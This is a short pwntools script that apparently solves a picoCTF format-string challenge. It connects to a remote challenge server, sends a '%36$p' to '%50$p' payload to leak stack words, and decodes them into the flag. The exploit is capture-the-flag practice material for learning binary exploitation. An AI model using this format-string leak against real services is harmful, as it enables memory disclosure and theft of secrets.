from pwn import *

context.binary = './vuln'
context.log_level = 'info'

# Run locally or connect remotely
# p = remote('saturn.picoctf.net', 51350)

Local = False
if Local:
    p = process('./vuln')
else:
    p = remote('saturn.picoctf.net', 49646)



# Leak multiple stack values (start from 36, get 4 words)
leak_fmt = b'%36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.%45$p.%46$p.%47$p.%48$p.%49$p.%50$p'
p.sendlineafter(b">> ", leak_fmt)

# Parse response
p.recvuntil(b"Here's a story - \n")
leaked = p.recvline().strip().split(b'.')

flag = b''
for val in leaked:
    if val.startswith(b'0x'):
        num = int(val, 16)
        flag += num.to_bytes((num.bit_length() + 7) // 8, 'little')

# Strip null bytes and decode
print(f"[+] Full ASCII Flag: {flag.strip(b'\x00').decode(errors='ignore')}")
